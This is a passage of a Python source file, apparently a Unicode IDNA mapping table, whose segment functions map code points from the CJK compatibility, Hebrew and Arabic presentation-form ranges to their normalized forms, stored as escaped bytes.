(0xFA57, \'M\', \'\xe7\xb7\xb4\'),\n    (0xFA58, \'M\', \'\xe7\xb8\x89\'),\n    (0xFA59, \'M\', \'\xe7\xb9\x81\'),\n    (0xFA5A, \'M\', \'\xe7\xbd\xb2\'),\n    (0xFA5B, \'M\', \'\xe8\x80\x85\'),\n    (0xFA5C, \'M\', \'\xe8\x87\xad\'),\n    (0xFA5D, \'M\', \'\xe8\x89\xb9\'),\n    (0xFA5F, \'M\', \'\xe8\x91\x97\'),\n    (0xFA60, \'M\', \'\xe8\xa4\x90\'),\n    (0xFA61, \'M\', \'\xe8\xa6\x96\'),\n    (0xFA62, \'M\', \'\xe8\xac\x81\'),\n    (0xFA63, \'M\', \'\xe8\xac\xb9\'),\n    (0xFA64, \'M\', \'\xe8\xb3\x93\'),\n    (0xFA65, \'M\', \'\xe8\xb4\x88\'),\n    (0xFA66, \'M\', \'\xe8\xbe\xb6\'),\n    (0xFA67, \'M\', \'\xe9\x80\xb8\'),\n    (0xFA68, \'M\', \'\xe9\x9b\xa3\'),\n    (0xFA69, \'M\', \'\xe9\x9f\xbf\'),\n    (0xFA6A, \'M\', \'\xe9\xa0\xbb\'),\n    (0xFA6B, \'M\', \'\xe6\x81\xb5\'),\n    (0xFA6C, \'M\', \'\xf0\xa4\x8b\xae\'),\n    (0xFA6D, \'M\', \'\xe8\x88\x98\'),\n    (0xFA6E, \'X\'),\n    (0xFA70, \'M\', \'\xe4\xb8\xa6\'),\n    (0xFA71, \'M\', \'\xe5\x86\xb5\'),\n    (0xFA72, \'M\', \'\xe5\x85\xa8\'),\n    (0xFA73, \'M\', \'\xe4\xbe\x80\'),\n    (0xFA74, \'M\', \'\xe5\x85\x85\'),\n    (0xFA75, \'M\', \'\xe5\x86\x80\'),\n    (0xFA76, \'M\', \'\xe5\x8b\x87\'),\n    (0xFA77, \'M\', \'\xe5\x8b\xba\'),\n    (0xFA78, \'M\', \'\xe5\x96\x9d\'),\n    ]\n\ndef _seg_43() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xFA79, \'M\', \'\xe5\x95\x95\'),\n    (0xFA7A, \'M\', \'\xe5\x96\x99\'),\n    (0xFA7B, \'M\', \'\xe5\x97\xa2\'),\n    (0xFA7C, \'M\', \'\xe5\xa1\x9a\'),\n    (0xFA7D, \'M\', \'\xe5\xa2\xb3\'),\n    (0xFA7E, \'M\', \'\xe5\xa5\x84\'),\n    (0xFA7F, \'M\', \'\xe5\xa5\x94\'),\n    (0xFA80, \'M\', \'\xe5\xa9\xa2\'),\n    (0xFA81, \'M\', \'\xe5\xac\xa8\'),\n    (0xFA82, \'M\', \'\xe5\xbb\x92\'),\n    (0xFA83, \'M\', \'\xe5\xbb\x99\'),\n    (0xFA84, \'M\', \'\xe5\xbd\xa9\'),\n    (0xFA85, \'M\', \'\xe5\xbe\xad\'),\n    (0xFA86, \'M\', \'\xe6\x83\x98\'),\n    (0xFA87, \'M\', \'\xe6\x85\x8e\'),\n    (0xFA88, \'M\', \'\xe6\x84\x88\'),\n    (0xFA89, \'M\', \'\xe6\x86\x8e\'),\n    (0xFA8A, \'M\', \'\xe6\x85\xa0\'),\n    (0xFA8B, \'M\', \'\xe6\x87\xb2\'),\n    (0xFA8C, \'M\', \'\xe6\x88\xb4\'),\n    (0xFA8D, \'M\', \'\xe6\x8f\x84\'),\n    (0xFA8E, \'M\', \'\xe6\x90\x9c\'),\n    (0xFA8F, \'M\', \'\xe6\x91\x92\'),\n    (0xFA90, \'M\', \'\xe6\x95\x96\'),\n    (0xFA91, \'M\', \'\xe6\x99\xb4\'),\n    (0xFA92, \'M\', \'\xe6\x9c\x97\'),\n    (0xFA93, \'M\', \'\xe6\x9c\x9b\'),\n    (0xFA94, \'M\', \'\xe6\x9d\x96\'),\n    (0xFA95, \'M\', \'\xe6\xad\xb9\'),\n    (0xFA96, \'M\', \'\xe6\xae\xba\'),\n    (0xFA97, \'M\', \'\xe6\xb5\x81\'),\n    (0xFA98, \'M\', \'\xe6\xbb\x9b\'),\n    (0xFA99, \'M\', \'\xe6\xbb\x8b\'),\n    (0xFA9A, \'M\', \'\xe6\xbc\xa2\'),\n    (0xFA9B, \'M\', \'\xe7\x80\x9e\'),\n    (0xFA9C, \'M\', \'\xe7\x85\xae\'),\n    (0xFA9D, \'M\', \'\xe7\x9e\xa7\'),\n    (0xFA9E, \'M\', \'\xe7\x88\xb5\'),\n    (0xFA9F, \'M\', \'\xe7\x8a\xaf\'),\n    (0xFAA0, \'M\', \'\xe7\x8c\xaa\'),\n    (0xFAA1, \'M\', \'\xe7\x91\xb1\'),\n    (0xFAA2, \'M\', \'\xe7\x94\x86\'),\n    (0xFAA3, \'M\', \'\xe7\x94\xbb\'),\n    (0xFAA4, \'M\', \'\xe7\x98\x9d\'),\n    (0xFAA5, \'M\', \'\xe7\x98\x9f\'),\n    (0xFAA6, \'M\', \'\xe7\x9b\x8a\'),\n    (0xFAA7, \'M\', \'\xe7\x9b\x9b\'),\n    (0xFAA8, \'M\', \'\xe7\x9b\xb4\'),\n    (0xFAA9, \'M\', \'\xe7\x9d\x8a\'),\n    (0xFAAA, \'M\', \'\xe7\x9d\x80\'),\n    (0xFAAB, \'M\', \'\xe7\xa3\x8c\'),\n    (0xFAAC, \'M\', \'\xe7\xaa\xb1\'),\n    (0xFAAD, \'M\', \'\xe7\xaf\x80\'),\n    (0xFAAE, \'M\', \'\xe7\xb1\xbb\'),\n    (0xFAAF, \'M\', \'\xe7\xb5\x9b\'),\n    (0xFAB0, \'M\', \'\xe7\xb7\xb4\'),\n    (0xFAB1, \'M\', \'\xe7\xbc\xbe\'),\n    (0xFAB2, \'M\', \'\xe8\x80\x85\'),\n    (0xFAB3, \'M\', \'\xe8\x8d\x92\'),\n    (0xFAB4, \'M\', \'\xe8\x8f\xaf\'),\n    (0xFAB5, \'M\', \'\xe8\x9d\xb9\'),\n    (0xFAB6, \'M\', \'\xe8\xa5\x81\'),\n    (0xFAB7, \'M\', \'\xe8\xa6\x86\'),\n    (0xFAB8, \'M\', \'\xe8\xa6\x96\'),\n    (0xFAB9, \'M\', \'\xe8\xaa\xbf\'),\n    (0xFABA, \'M\', \'\xe8\xab\xb8\'),\n    (0xFABB, \'M\', \'\xe8\xab\x8b\'),\n    (0xFABC, \'M\', \'\xe8\xac\x81\'),\n    (0xFABD, \'M\', \'\xe8\xab\xbe\'),\n    (0xFABE, \'M\', \'\xe8\xab\xad\'),\n    (0xFABF, \'M\', \'\xe8\xac\xb9\'),\n    (0xFAC0, \'M\', \'\xe8\xae\x8a\'),\n    (0xFAC1, \'M\', \'\xe8\xb4\x88\'),\n    (0xFAC2, \'M\', \'\xe8\xbc\xb8\'),\n    (0xFAC3, \'M\', \'\xe9\x81\xb2\'),\n    (0xFAC4, \'M\', \'\xe9\x86\x99\'),\n    (0xFAC5, \'M\', \'\xe9\x89\xb6\'),\n    (0xFAC6, \'M\', \'\xe9\x99\xbc\'),\n    (0xFAC7, \'M\', \'\xe9\x9b\xa3\'),\n    (0xFAC8, \'M\', \'\xe9\x9d\x96\'),\n    (0xFAC9, \'M\', \'\xe9\x9f\x9b\'),\n    (0xFACA, \'M\', \'\xe9\x9f\xbf\'),\n    (0xFACB, \'M\', \'\xe9\xa0\x8b\'),\n    (0xFACC, \'M\', \'\xe9\xa0\xbb\'),\n    (0xFACD, \'M\', \'\xe9\xac\x92\'),\n    (0xFACE, \'M\', \'\xe9\xbe\x9c\'),\n    (0xFACF, \'M\', \'\xf0\xa2\xa1\x8a\'),\n    (0xFAD0, \'M\', \'\xf0\xa2\xa1\x84\'),\n    (0xFAD1, \'M\', \'\xf0\xa3\x8f\x95\'),\n    (0xFAD2, \'M\', \'\xe3\xae\x9d\'),\n    (0xFAD3, \'M\', \'\xe4\x80\x98\'),\n    (0xFAD4, \'M\', \'\xe4\x80\xb9\'),\n    (0xFAD5, \'M\', \'\xf0\xa5\x89\x89\'),\n    (0xFAD6, \'M\', \'\xf0\xa5\xb3\x90\'),\n    (0xFAD7, \'M\', \'\xf0\xa7\xbb\x93\'),\n    (0xFAD8, \'M\', \'\xe9\xbd\x83\'),\n    (0xFAD9, \'M\', \'\xe9\xbe\x8e\'),\n    (0xFADA, \'X\'),\n    (0xFB00, \'M\', \'ff\'),\n    (0xFB01, \'M\', \'fi\'),\n    ]\n\ndef _seg_44() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xFB02, \'M\', \'fl\'),\n    (0xFB03, \'M\', \'ffi\'),\n    (0xFB04, \'M\', \'ffl\'),\n    (0xFB05, \'M\', \'st\'),\n    (0xFB07, \'X\'),\n    (0xFB13, \'M\', \'\xd5\xb4\xd5\xb6\'),\n    (0xFB14, \'M\', \'\xd5\xb4\xd5\xa5\'),\n    (0xFB15, \'M\', \'\xd5\xb4\xd5\xab\'),\n    (0xFB16, \'M\', \'\xd5\xbe\xd5\xb6\'),\n    (0xFB17, \'M\', \'\xd5\xb4\xd5\xad\'),\n    (0xFB18, \'X\'),\n    (0xFB1D, \'M\', \'\xd7\x99\xd6\xb4\'),\n    (0xFB1E, \'V\'),\n    (0xFB1F, \'M\', \'\xd7\xb2\xd6\xb7\'),\n    (0xFB20, \'M\', \'\xd7\xa2\'),\n    (0xFB21, \'M\', \'\xd7\x90\'),\n    (0xFB22, \'M\', \'\xd7\x93\'),\n    (0xFB23, \'M\', \'\xd7\x94\'),\n    (0xFB24, \'M\', \'\xd7\x9b\'),\n    (0xFB25, \'M\', \'\xd7\x9c\'),\n    (0xFB26, \'M\', \'\xd7\x9d\'),\n    (0xFB27, \'M\', \'\xd7\xa8\'),\n    (0xFB28, \'M\', \'\xd7\xaa\'),\n    (0xFB29, \'3\', \'+\'),\n    (0xFB2A, \'M\', \'\xd7\xa9\xd7\x81\'),\n    (0xFB2B, \'M\', \'\xd7\xa9\xd7\x82\'),\n    (0xFB2C, \'M\', \'\xd7\xa9\xd6\xbc\xd7\x81\'),\n    (0xFB2D, \'M\', \'\xd7\xa9\xd6\xbc\xd7\x82\'),\n    (0xFB2E, \'M\', \'\xd7\x90\xd6\xb7\'),\n    (0xFB2F, \'M\', \'\xd7\x90\xd6\xb8\'),\n    (0xFB30, \'M\', \'\xd7\x90\xd6\xbc\'),\n    (0xFB31, \'M\', \'\xd7\x91\xd6\xbc\'),\n    (0xFB32, \'M\', \'\xd7\x92\xd6\xbc\'),\n    (0xFB33, \'M\', \'\xd7\x93\xd6\xbc\'),\n    (0xFB34, \'M\', \'\xd7\x94\xd6\xbc\'),\n    (0xFB35, \'M\', \'\xd7\x95\xd6\xbc\'),\n    (0xFB36, \'M\', \'\xd7\x96\xd6\xbc\'),\n    (0xFB37, \'X\'),\n    (0xFB38, \'M\', \'\xd7\x98\xd6\xbc\'),\n    (0xFB39, \'M\', \'\xd7\x99\xd6\xbc\'),\n    (0xFB3A, \'M\', \'\xd7\x9a\xd6\xbc\'),\n    (0xFB3B, \'M\', \'\xd7\x9b\xd6\xbc\'),\n    (0xFB3C, \'M\', \'\xd7\x9c\xd6\xbc\'),\n    (0xFB3D, \'X\'),\n    (0xFB3E, \'M\', \'\xd7\x9e\xd6\xbc\'),\n    (0xFB3F, \'X\'),\n    (0xFB40, \'M\', \'\xd7\xa0\xd6\xbc\'),\n    (0xFB41, \'M\', \'\xd7\xa1\xd6\xbc\'),\n    (0xFB42, \'X\'),\n    (0xFB43, \'M\', \'\xd7\xa3\xd6\xbc\'),\n    (0xFB44, \'M\', \'\xd7\xa4\xd6\xbc\'),\n    (0xFB45, \'X\'),\n    (0xFB46, \'M\', \'\xd7\xa6\xd6\xbc\'),\n    (0xFB47, \'M\', \'\xd7\xa7\xd6\xbc\'),\n    (0xFB48, \'M\', \'\xd7\xa8\xd6\xbc\'),\n    (0xFB49, \'M\', \'\xd7\xa9\xd6\xbc\'),\n    (0xFB4A, \'M\', \'\xd7\xaa\xd6\xbc\'),\n    (0xFB4B, \'M\', \'\xd7\x95\xd6\xb9\'),\n    (0xFB4C, \'M\', \'\xd7\x91\xd6\xbf\'),\n    (0xFB4D, \'M\', \'\xd7\x9b\xd6\xbf\'),\n    (0xFB4E, \'M\', \'\xd7\xa4\xd6\xbf\'),\n    (0xFB4F, \'M\', \'\xd7\x90\xd7\x9c\'),\n    (0xFB50, \'M\', \'\xd9\xb1\'),\n    (0xFB52, \'M\', \'\xd9\xbb\'),\n    (0xFB56, \'M\', \'\xd9\xbe\'),\n    (0xFB5A, \'M\', \'\xda\x80\'),\n    (0xFB5E, \'M\', \'\xd9\xba\'),\n    (0xFB62, \'M\', \'\xd9\xbf\'),\n    (0xFB66, \'M\', \'\xd9\xb9\'),\n    (0xFB6A, \'M\', \'\xda\xa4\'),\n    (0xFB6E, \'M\', \'\xda\xa6\'),\n    (0xFB72, \'M\', \'\xda\x84\'),\n    (0xFB76, \'M\', \'\xda\x83\'),\n    (0xFB7A, \'M\', \'\xda\x86\'),\n    (0xFB7E, \'M\', \'\xda\x87\'),\n    (0xFB82, \'M\', \'\xda\x8d\'),\n    (0xFB84, \'M\', \'\xda\x8c\'),\n    (0xFB86, \'M\', \'\xda\x8e\'),\n    (0xFB88, \'M\', \'\xda\x88\'),\n    (0xFB8A, \'M\', \'\xda\x98\'),\n    (0xFB8C, \'M\', \'\xda\x91\'),\n    (0xFB8E, \'M\', \'\xda\xa9\'),\n    (0xFB92, \'M\', \'\xda\xaf\'),\n    (0xFB96, \'M\', \'\xda\xb3\'),\n    (0xFB9A, \'M\', \'\xda\xb1\'),\n    (0xFB9E, \'M\', \'\xda\xba\'),\n    (0xFBA0, \'M\', \'\xda\xbb\'),\n    (0xFBA4, \'M\', \'\xdb\x80\'),\n    (0xFBA6, \'M\', \'\xdb\x81\'),\n    (0xFBAA, \'M\', \'\xda\xbe\'),\n    (0xFBAE, \'M\', \'\xdb\x92\'),\n    (0xFBB0, \'M\', \'\xdb\x93\'),\n    (0xFBB2, \'V\'),\n    (0xFBC3, \'X\'),\n    (0xFBD3, \'M\', \'\xda\xad\'),\n    (0xFBD7, \'M\', \'\xdb\x87\'),\n    (0xFBD9, \'M\', \'\xdb\x86\'),\n    (0xFBDB, \'M\', \'\xdb\x88\'),\n    (0xFBDD, \'M\', \'\xdb\x87\xd9\xb4\'),\n    (0xFBDE, \'M\', \'\xdb\x8b\'),\n    ]\n\ndef _seg_45() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xFBE0, \'M\', \'\xdb\x85\'),\n    (0xFBE2, \'M\', \'\xdb\x89\'),\n    (0xFBE4, \'M\', \'\xdb\x90\'),\n    (0xFBE8, \'M\', \'\xd9\x89\'),\n    (0xFBEA, \'M\', \'\xd8\xa6\xd8\xa7\'),\n    (0xFBEC, \'M\', \'\xd8\xa6\xdb\x95\'),\n    (0xFBEE, \'M\', \'\xd8\xa6\xd9\x88\'),\n    (0xFBF0, \'M\', \'\xd8\xa6\xdb\x87\'),\n    (0xFBF2, \'M\', \'\xd8\xa6\xdb\x86\'),\n    (0xFBF4, \'M\', \'\xd8\xa6\xdb\x88\'),\n    (0xFBF6, \'M\', \'\xd8\xa6\xdb\x90\'),\n    (0xFBF9, \'M\', \'\xd8\xa6\xd9\x89\'),\n    (0xFBFC, \'M\', \'\xdb\x8c\'),\n    (0xFC00, \'M\', \'\xd8\xa6\xd8\xac\'),\n    (0xFC01, \'M\', \'\xd8\xa6\xd8\xad\'),\n    (0xFC02, \'M\', \'\xd8\xa6\xd9\x85\'),\n    (0xFC03, \'M\', \'\xd8\xa6\xd9\x89\'),\n    (0xFC04, \'M\', \'\xd8\xa6\xd9\x8a\'),\n    (0xFC05, \'M\', \'\xd8\xa8\xd8\xac\'),\n    (0xFC06, \'M\', \'\xd8\xa8\xd8\xad\'),\n    (0xFC07, \'M\', \'\xd8\xa8\xd8\xae\'),\n    (0xFC08, \'M\', \'\xd8\xa8\xd9\x85\'),\n    (0xFC09, \'M\', \'\xd8\xa8\xd9\x89\'),\n    (0xFC0A, \'M\', \'\xd8\xa8\xd9\x8a\'),\n    (0xFC0B, \'M\', \'\xd8\xaa\xd8\xac\'),\n    (0xFC0C, \'M\', \'\xd8\xaa\xd8\xad\'),\n    (0xFC0D, \'M\', \'\xd8\xaa\xd8\xae\'),\n    (0xFC0E, \'M\', \'\xd8\xaa\xd9\x85\'),\n    (0xFC0F, \'M\', \'\xd8\xaa\xd9\x89\'),\n    (0xFC10, \'M\', \'\xd8\xaa\xd9\x8a\'),\n    (0xFC11, \'M\', \'\xd8\xab\xd8\xac\'),\n    (0xFC12, \'M\', \'\xd8\xab\xd9\x85\'),\n    (0xFC13, \'M\', \'\xd8\xab\xd9\x89\'),\n    (0xFC14, \'M\', \'\xd8\xab\xd9\x8a\'),\n    (0xFC15, \'M\', \'\xd8\xac\xd8\xad\'),\n    (0xFC16, \'M\', \'\xd8\xac\xd9\x85\'),\n    (0xFC17, \'M\', \'\xd8\xad\xd8\xac\'),\n    (0xFC18, \'M\', \'\xd8\xad\xd9\x85\'),\n    (0xFC19, \'M\', \'\xd8\xae\xd8\xac\'),\n    (0xFC1A, \'M\', \'\xd8\xae\xd8\xad\'),\n    (0xFC1B, \'M\', \'\xd8\xae\xd9\x85\'),\n    (0xFC1C, \'M\', \'\xd8\xb3\xd8\xac\'),\n    (0xFC1D, \'M\', \'\xd8\xb3\xd8\xad\'),\n    (0xFC1E, \'M\', \'\xd8\xb3\xd8\xae\'),\n    (0xFC1F, \'M\', \'\xd8\xb3\xd9\x85\'),\n    (0xFC20, \'M\', \'\xd8\xb5\xd8\xad\'),\n    (0xFC21, \'M\', \'\xd8\xb5\xd9\x85\'),\n    (0xFC22, \'M\', \'\xd8\xb6\xd8\xac\'),\n    (0xFC23, \'M\', \'\xd8\xb6\xd8\xad\'),\n    (0xFC24, \'M\', \'\xd8\xb6\xd8\xae\'),\n    (0xFC25, \'M\', \'\xd8\xb6\xd9\x85\'),\n    (0xFC26, \'M\', \'\xd8\xb7\xd8\xad\'),\n    (0xFC27, \'M\', \'\xd8\xb7\xd9\x85\'),\n    (0xFC28, \'M\', \'\xd8\xb8\xd9\x85\'),\n    (0xFC29, \'M\', \'\xd8\xb9\xd8\xac\'),\n    (0xFC2A, \'M\', \'\xd8\xb9\xd9\x85\'),\n    (0xFC2B, \'M\', \'\xd8\xba\xd8\xac\'),\n    (0xFC2C, \'M\', \'\xd8\xba\xd9\x85\'),\n    (0xFC2D, \'M\', \'\xd9\x81\xd8\xac\'),\n    (0xFC2E, \'M\', \'\xd9\x81\xd8\xad\'),\n    (0xFC2F, \'M\', \'\xd9\x81\xd8\xae\'),\n    (0xFC30, \'M\', \'\xd9\x81\xd9\x85\'),\n    (0xFC31, \'M\', \'\xd9\x81\xd9\x89\'),\n    (0xFC32, \'M\', \'\xd9\x81\xd9\x8a\'),\n    (0xFC33, \'M\', \'\xd9\x82\xd8\xad\'),\n    (0xFC34, \'M\', \'\xd9\x82\xd9\x85\'),\n    (0xFC35, \'M\', \'\xd9\x82\xd9\x89\'),\n    (0xFC36, \'M\', \'\xd9\x82\xd9\x8a\'),\n    (0xFC37, \'M\', \'\xd9\x83\xd8\xa7\'),\n    (0xFC38, \'M\', \'\xd9\x83\xd8\xac\'),\n    (0xFC39, \'M\', \'\xd9\x83\xd8\xad\'),\n    (0xFC3A, \'M\', \'\xd9\x83\xd8\xae\'),\n    (0xFC3B, \'M\', \'\xd9\x83\xd9\x84\'),\n    (0xFC3C, \'M\', \'\xd9\x83\xd9\x85\'),\n    (0xFC3D, \'M\', \'\xd9\x83\xd9\x89\'),\n    (0xFC3E, \'M\', \'\xd9\x83\xd9\x8a\'),\n    (0xFC3F, \'M\', \'\xd9\x84\xd8\xac\'),\n    (0xFC40, \'M\', \'\xd9\x84\xd8\xad\'),\n    (0xFC41, \'M\', \'\xd9\x84\xd8\xae\'),\n    (0xFC42, \'M\', \'\xd9\x84\xd9\x85\'),\n    (0xFC43, \'M\', \'\xd9\x84\xd9\x89\'),\n    (0xFC44, \'M\', \'\xd9\x84\xd9\x8a\'),\n    (0xFC45, \'M\', \'\xd9\x85\xd8\xac\'),\n    (0xFC46, \'M\', \'\xd9\x85\xd8\xad\'),\n    (0xFC47, \'M\', \'\xd9\x85\xd8\xae\'),\n    (0xFC48, \'M\', \'\xd9\x85\xd9\x85\'),\n    (0xFC49, \'M\', \'\xd9\x85\xd9\x89\'),\n    (0xFC4A, \'M\', \'\xd9\x85\xd9\x8a\'),\n    (0xFC4B, \'M\', \'\xd9\x86\xd8\xac\'),\n    (0xFC4C, \'M\', \'\xd9\x86\xd8\xad\'),\n    (0xFC4D, \'M\', \'\xd9\x86\xd8\xae\'),\n    (0xFC4E, \'M\', \'\xd9\x86\xd9\x85\'),\n    (0xFC4F, \'M\', \'\xd9\x86\xd9\x89\'),\n    (0xFC50, \'M\', \'\xd9\x86\xd9\x8a\'),\n    (0xFC51, \'M\', \'\xd9\x87\xd8\xac\'),\n    (0xFC52, \'M\', \'\xd9\x87\xd9\x85\'),\n    (0xFC53, \'M\', \'\xd9\x87\xd9\x89\'),\n    (0xFC54, \'M\', \'\xd9\x87\xd9\x8a\'),\n    (0xFC55, \'M\', \'\xd9\x8a\xd8\xac\'),\n    (0xFC56, \'M\', \'\xd9\x8a\xd8\xad\'),\n    ]\n\ndef _seg_46() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xFC57, \'M\', \'\xd9\x8a\xd8\xae\'),\n    (0xFC58, \'M\', \'\xd9\x8a\xd9\x85\'),\n    (0xFC59, \'M\', \'\xd9\x8a\xd9\x89\'),\n    (0xFC5A, \'M\', \'\xd9\x8a\xd9\x8a\'),\n    (0xFC5B, \'M\', \'\xd8\xb0\xd9\xb0\'),\n    (0xFC5C, \'M\', \'\xd8\xb1\xd9\xb0\'),\n    (0xFC5D, \'M\', \'\xd9\x89\xd9\xb0\'),\n    (0xFC5E, \'3\', \' \xd9\x8c\xd9\x91\'),\n    (0xFC5F, \'3\', \' \xd9\x8d\xd9\x91\'),\n    (0xFC60, \'3\', \' \xd9\x8e\xd9\x91\'),\n    (0xFC61, \'3\', \' \xd9\x8f\xd9\x91\'),\n    (0xFC62, \'3\', \' \xd9\x90\xd9\x91\'),\n    (0xFC63, \'3\', \' \xd9\x91\xd9\xb0\'),\n    (0xFC64, \'M\', \'\xd8\xa6\xd8\xb1\'),\n    (0xFC65, \'M\', \'\xd8\xa6\xd8\xb2\'),\n    (0xFC66, \'M\', \'\xd8\xa6\xd9\x85\'),\n    (0xFC67, \'M\', \'\xd8\xa6\xd9\x86\'),\n    (0xFC68, \'M\', \'\xd8\xa6\xd9\x89\'),\n    (0xFC69, \'M\', \'\xd8\xa6\xd9\x8a\'),\n    (0xFC6A, \'M\', \'\xd8\xa8\xd8\xb1\'),\n    (0xFC6B, \'M\', \'\xd8\xa8\xd8\xb2\'),\n    (0xFC6C, \'M\', \'\xd8\xa8\xd9\x85\'),\n    (0xFC6D, \'M\', \'\xd8\xa8\xd9\x86\'),\n    (0xFC6E, \'M\', \'\xd8\xa8\xd9\x89\'),\n    (0xFC6F, \'M\', \'\xd8\xa8\xd9\x8a\'),\n    (0xFC70, \'M\', \'\xd8\xaa\xd8\xb1\'),\n    (0xFC71, \'M\', \'\xd8\xaa\xd8\xb2\'),\n    (0xFC72, \'M\', \'\xd8\xaa\xd9\x85\'),\n    (0xFC73, \'M\', \'\xd8\xaa\xd9\x86\'),\n    (0xFC74, \'M\', \'\xd8\xaa\xd9\x89\'),\n    (0xFC75, \'M\', \'\xd8\xaa\xd9\x8a\'),\n    (0xFC76, \'M\', \'\xd8\xab\xd8\xb1\'),\n    (0xFC77, \'M\', \'\xd8\xab\xd8\xb2\'),\n    (0xFC78, \'M\', \'\xd8\xab\xd9\x85\'),\n    (0xFC79, \'M\', \'\xd8\xab\xd9\x86\'),\n    (0xFC7A, \'M\', \'\xd8\xab\xd9\x89\'),\n    (0xFC7B, \'M\', \'\xd8\xab\xd9\x8a\'),\n    (0xFC7C, \'M\', \'\xd9\x81\xd9\x89\'),\n    (0xFC7D, \'M\', \'\xd9\x81\xd9\x8a\'),\n    (0xFC7E, \'M\', \'\xd9\x82\xd9\x89\'),\n    (0xFC7F, \'M\', \'\xd9\x82\xd9\x8a\'),\n    (0xFC80, \'M\', \'\xd9\x83\xd8\xa7\'),\n    (0xFC81, \'M\', \'\xd9\x83\xd9\x84\'),\n    (0xFC82, \'M\', \'\xd9\x83\xd9\x85\'),\n    (0xFC83, \'M\', \'\xd9\x83\xd9\x89\'),\n    (0xFC84, \'M\', \'\xd9\x83\xd9\x8a\'),\n    (0xFC85, \'M\', \'\xd9\x84\xd9\x85\'),\n    (0xFC86, \'M\', \'\xd9\x84\xd9\x89\'),\n    (0xFC87, \'M\', \'\xd9\x84\xd9\x8a\'),\n    (0xFC88, \'M\', \'\xd9\x85\xd8\xa7\'),\n    (0xFC89, \'M\', \'\xd9\x85\xd9\x85\'),\n    (0xFC8A, \'M\', \'\xd9\x86\xd8\xb1\'),\n    (0xFC8B, \'M\', \'\xd9\x86\xd8\xb2\'),\n    (0xFC8C, \'M\', \'\xd9\x86\xd9\x85\'),\n    (0xFC8D, \'M\', \'\xd9\x86\xd9\x86\'),\n    (0xFC8E, \'M\', \'\xd9\x86\xd9\x89\'),\n    (0xFC8F, \'M\', \'\xd9\x86\xd9\x8a\'),\n    (0xFC90, \'M\', \'\xd9\x89\xd9\xb0\'),\n    (0xFC91, \'M\', \'\xd9\x8a\xd8\xb1\'),\n    (0xFC92, \'M\', \'\xd9\x8a\xd8\xb2\'),\n    (0xFC93, \'M\', \'\xd9\x8a\xd9\x85\'),\n    (0xFC94, \'M\', \'\xd9\x8a\xd9\x86\'),\n    (0xFC95, \'M\', \'\xd9\x8a\xd9\x89\'),\n    (0xFC96, \'M\', \'\xd9\x8a\xd9\x8a\'),\n    (0xFC97, \'M\', \'\xd8\xa6\xd8\xac\'),\n    (0xFC98, \'M\', \'\xd8\xa6\xd8\xad\'),\n    (0xFC99, \'M\', \'\xd8\xa6\xd8\xae\'),\n    (0xFC9A, \'M\', \'\xd8\xa6\xd9\x85\'),\n    (0xFC9B, \'M\', \'\xd8\xa6\xd9\x87\'),\n    (0xFC9C, \'M\', \'\xd8\xa8\xd8\xac\'),\n    (0xFC9D, \'M\', \'\xd8\xa8\xd8\xad\'),\n    (0xFC9E, \'M\', \'\xd8\xa8\xd8\xae\'),\n    (0xFC9F, \'M\', \'\xd8\xa8\xd9\x85\'),\n    (0xFCA0, \'M\', \'\xd8\xa8\xd9\x87\'),\n    (0xFCA1, \'M\', \'\xd8\xaa\xd8\xac\'),\n    (0xFCA2, \'M\', \'\xd8\xaa\xd8\xad\'),\n    (0xFCA3, \'M\', \'\xd8\xaa\xd8\xae\'),\n    (0xFCA4, \'M\', \'\xd8\xaa\xd9\x85\'),\n    (0xFCA5, \'M\', \'\xd8\xaa\xd9\x87\'),\n    (0xFCA6, \'M\', \'\xd8\xab\xd9\x85\'),\n    (0xFCA7, \'M\', \'\xd8\xac\xd8\xad\'),\n    (0xFCA8, \'M\', \'\xd8\xac\xd9\x85\'),\n    (0xFCA9, \'M\', \'\xd8\xad\xd8\xac\'),\n    (0xFCAA, \'M\', \'\xd8\xad\xd9\x85\'),\n    (0xFCAB, \'M\', \'\xd8\xae\xd8\xac\'),\n    (0xFCAC, \'M\', \'\xd8\xae\xd9\x85\'),\n    (0xFCAD, \'M\', \'\xd8\xb3\xd8\xac\'),\n    (0xFCAE, \'M\', \'\xd8\xb3\xd8\xad\'),\n    (0xFCAF, \'M\', \'\xd8\xb3\xd8\xae\'),\n    (0xFCB0, \'M\', \'\xd8\xb3\xd9\x85\'),\n    (0xFCB1, \'M\', \'\xd8\xb5\xd8\xad\'),\n    (0xFCB2, \'M\', \'\xd8\xb5\xd8\xae\'),\n    (0xFCB3, \'M\', \'\xd8\xb5\xd9\x85\'),\n    (0xFCB4, \'M\', \'\xd8\xb6\xd8\xac\'),\n    (0xFCB5, \'M\', \'\xd8\xb6\xd8\xad\'),\n    (0xFCB6, \'M\', \'\xd8\xb6\xd8\xae\'),\n    (0xFCB7, \'M\', \'\xd8\xb6\xd9\x85\'),\n    (0xFCB8, \'M\', \'\xd8\xb7\xd8\xad\'),\n    (0xFCB9, \'M\', \'\xd8\xb8\xd9\x85\'),\n    (0xFCBA, \'M\', \'\xd8\xb9\xd8\xac\'),\n    ]\n\ndef _seg_47() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xFCBB, \'M\', \'\xd8\xb9\xd9\x85\'),\n    (0xFCBC, \'M\', \'\xd8\xba\xd8\xac\'),\n    (0xFCBD, \'M\', \'\xd8\xba\xd9\x85\'),\n    (0xFCBE, \'M\', \'\xd9\x81\xd8\xac\'),\n    (0xFCBF, \'M\', \'\xd9\x81\xd8\xad\'),\n    (0xFCC0, \'M\', \'\xd9\x81\xd8\xae\'),\n    (0xFCC1, \'M\', \'\xd9\x81\xd9\x85\'),\n    (0xFCC2, \'M\', \'\xd9\x82\xd8\xad\'),\n    (0xFCC3, \'M\', \'\xd9\x82\xd9\x85\'),\n    (0xFCC4, \'M\', \'\xd9\x83\xd8\xac\'),\n    (0xFCC5, \'M\', \'\xd9\x83\xd8\xad\'),\n    (0xFCC6, \'M\', \'\xd9\x83\xd8\xae\'),\n    (0xFCC7, \'M\', \'\xd9\x83\xd9\x84\'),\n    (0xFCC8, \'M\', \'\xd9\x83\xd9\x85\'),\n    (0xFCC9, \'M\', \'\xd9\x84\xd8\xac\'),\n    (0xFCCA, \'M\', \'\xd9\x84\xd8\xad\'),\n    (0xFCCB, \'M\', 